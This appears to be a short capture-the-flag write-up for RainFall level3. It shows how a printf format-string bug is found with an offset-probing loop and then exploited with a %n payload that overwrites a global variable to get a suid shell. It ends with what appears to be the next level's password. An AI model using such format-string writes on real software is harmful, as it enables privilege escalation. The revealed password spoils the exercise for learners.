@@ -1,0 +1,15 @@
+We found a function "v", which compare a global m to 0x40, if it's equal we can launch a shell. So we found the exploit was printf, because we were free to use any format string.
+
+level3@RainFall:/home/user/level3$ for((i=0;i<10;i++));do echo "Index $i" && ./level3 <<< "AAAA%$i\$x" ; done | grep -B1 41414141
+Index 4
+AAAA41414141
+
+We found that we could write at m's address writting in the 4th offset of the stack.
+
+80484da:       a1 8c 98 04 08          mov    0x804988c,%eax 	<--- m address (0x804988c)
+80484df:       83 f8 40                cmp    $0x40,%eax
+
+Since we use $n to write on the global "m", we write 0x40 characters before to have a shell access with suid level4.
+
+cat <(`python -c 'print ("\x8c\x98\x04\x08" + "a" * 0x3c + "%4$n")'`) -| ./level3
+└-> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
